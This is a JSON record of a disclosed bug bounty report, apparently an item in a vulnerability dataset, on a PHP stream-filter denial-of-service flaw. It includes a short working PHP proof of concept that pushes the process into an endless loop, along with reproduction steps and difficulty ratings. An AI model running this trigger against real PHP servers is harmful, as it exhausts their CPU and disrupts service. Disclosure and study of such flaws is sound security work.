{
  "reported_to": "Internet Bug Bounty",
  "reported_by": "meitis ",
  "title": "DOS in stream filters",
  "content": "\nsee bug report\nhttps://bugs.php.net/bug.php?id=76249\nas simple as\nCode 372 Bytes\n1<?php\n2$fh = fopen('php://memory', 'rw');\n3fwrite($fh, \"abc\");\n4rewind($fh);\n5stream_filter_append($fh, 'convert.iconv.iso-10646/utf8//IGNORE', STREAM_FILTER_READ, []);\n6echo stream_get_contents($fh);\n7\n8=> one process running in an endless loop\n9\n10## Impact\n11\n12DOS, process ends up in an endless loop, CPU (or available php processes or both) of affected system get easily exhausted\n\n",
  "severity": [
    7.5,
    null
  ],
  "bounty": null,
  "weaknesses": [
    "Uncontrolled Resource Consumption"
  ],
  "screenshots": {},
  "disclosed_date": 1602501720,
  "report_url": "https://hackerone.com/reports/505278",
  "is_multi_component": true,
  "complexity": "MEDIUM",
  "novelty": "MEDIUM",
  "vuln_category": "CODE",
  "steps": [
    [
      1,
      "Open a PHP file and write the following code to create a memory stream and write 'abc' to it."
    ],
    [
      2,
      "Append a stream filter 'convert.iconv.iso-10646/utf8//IGNORE' to the stream and attempt to read its contents, causing an endless loop."
    ]
  ],
  "vuln_description": "The vulnerability is a Denial of Service (DOS) issue in PHP's stream filters, specifically when using the 'convert.iconv.iso-10646/utf8//IGNORE' filter with a memory stream. The process enters an endless loop, exhausting CPU resources or available PHP processes.",
  "reason": "The vulnerability involves a straightforward interaction with PHP's stream filters and memory streams, but the specific filter and its behavior leading to an endless loop is a subtle and non-obvious interaction. The discovery requires knowledge of PHP's stream filter mechanisms and the specific filter's behavior.",
  "new_complexity": "MEDIUM",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null
}